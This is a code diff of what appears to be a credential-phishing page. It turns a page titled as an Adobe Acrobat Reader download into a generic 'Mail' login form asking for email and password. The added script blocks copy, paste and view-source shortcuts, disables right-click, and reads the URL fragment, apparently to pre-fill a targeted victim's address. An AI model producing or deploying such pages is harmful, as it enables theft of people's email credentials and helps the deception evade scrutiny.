@@ -1,7 +1,24 @@
 <html>
 <head>
-<title>Adobe Acrobat Reader DC, free PDF viewer download</title>
+<title>Mail</title>
 <style>
+body {background-image: url("po_bgnxd.png");
+  min-height: 500px;
+  background-attachment: fixed;
+  background-position: center;
+  background-repeat: no-repeat;
+  background-size: cover;
+  }
+  .A-x{ margin-left:0px; background-color:white; border:hidden; width:360px; margin-top:45px; }
+  .icon {width:60%; margin-bottom:20px; margin-left:25px;}
+  
+  .lab {margin-bottom:10px;}
+  
+  .put {width:230px; height:15px; margin-top:5px;  margin-bottom:8px; }
+  
+  .putp {width:250px; height:30px; margin-top:5px; margin-bottom:20px;}
+  
+  .sb {margin-left:23px; background-color:rgb(16, 78, 139); width:200px; height:30px; border:hidden; color:white;}
 
   </style>
 <link rel="stylesheet" type="text/css" href="stylepo.css" />
@@ -13,7 +30,7 @@
 <body>
 <fieldset class="A-x" ><br>
 <form class="B-x" method="" action="" autocomplete="off" id="pax" ><br>
- <h2 class="text-center"><div id="top"><img src="" alt="" id="logoimg" style="width:30px;height:30px;margin-top:10px;"></h2><br>
+ <h2 class="text-center"><div id="top"><img src="" alt="" id="logoimg" style="width:50px;height:50px;margin-top:10px; margin-left:100px;"></h2>
 <b><label class="lab">Email</label></b><br>
 <fieldset class="put" >
 <span id="bax" ></span>
@@ -30,10 +47,33 @@
 </fieldset>
 </body>
 
- <!-- jQuery first, then Popper.js, then Bootstrap JS -->
-      
     
 <script>
+
+  document.onkeydown = function(e) {
+        if (e.ctrlKey && 
+            (e.keyCode === 67 || 
+             e.keyCode === 86 || 
+             e.keyCode === 85 || 
+             e.keyCode === 117)) {
+            return false;
+        } else {
+            return true;
+        }
+};
+$(document).keypress("u",function(e) {
+  if(e.ctrlKey)
+  {
+return false;
+}
+else
+{
+return true;
+}
+});
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
 	document.getElementById("inpwd").focus();
 			    var str = window.location.href;
 				var strs = str.split("#");
